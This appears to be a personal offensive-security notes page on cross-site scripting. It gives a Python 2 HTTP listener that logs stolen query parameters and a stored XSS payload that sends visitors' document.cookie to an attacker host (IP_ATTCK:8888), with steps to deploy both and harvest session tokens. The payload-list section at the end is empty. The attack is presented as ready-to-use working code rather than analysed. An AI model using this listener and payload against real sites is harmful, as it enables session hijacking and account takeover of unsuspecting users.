---
title: XSS attacks 💀
---
> You should check [XSS Theory 🍣](/notes/Info/xss_theory.md)

## Testing Payloads

- [PortSwigger Theory and examples](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [OWASP collection](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

>Check my note [payloadbox XSS Payload List 🥝](/notes/Payloads/XSS/payloadbox.md)

## Scripts

- When performing an stored XSS, we have the following useful script (python2):

```python
#!/usr/bin/env python
# POC for cookie stealing through XSS
# Should work with:
# <script>
#   image = new Image();
#   image.src='http://X.X.X.X:8888/?'+document.cookie;
# </script>

# Written by Ahmed Shawky @lnxg33k

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from urlparse import urlparse, parse_qs
from datetime import datetime


class MyHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        query_components = parse_qs(urlparse(self.path).query)
        print ""
        print "%s - %s\t%s" % (
            datetime.now().strftime("%Y-%m-%d %I:%M %p"),
            self.client_address[0],
            self.headers['user-agent'])
        print "-------------------"*6
        for k, v in query_components.items():
            print "%s\t\t\t%s" % (k.strip(), v)

        # print query_components
        # self.send_response(500)

        # self.send_header("Content-type", "text/html")
        # self.end_headers()
        # self.wfile.write(c)

        return

    def log_message(self, format, *args):
        return

if __name__ == "__main__":
    try:
        server = HTTPServer(('0.0.0.0', 8888), MyHandler)
        print('Started http server')
        server.serve_forever()
    except KeyboardInterrupt:
        print('^C received, shutting down server')
        server.socket.close()
```

- Execute it
- Then we insert on the webpage the following XSS:

```shell
<script>
   image = new Image();
   image.src='http://IP_ATTCK:8888/?'+document.cookie;
</script>
```

- Then we should get some session tokens like this (when someone clicks on it):

![](Pasted%20image%2020240210145953.png)

## Lists of payloads (large)

### a

```shell

```
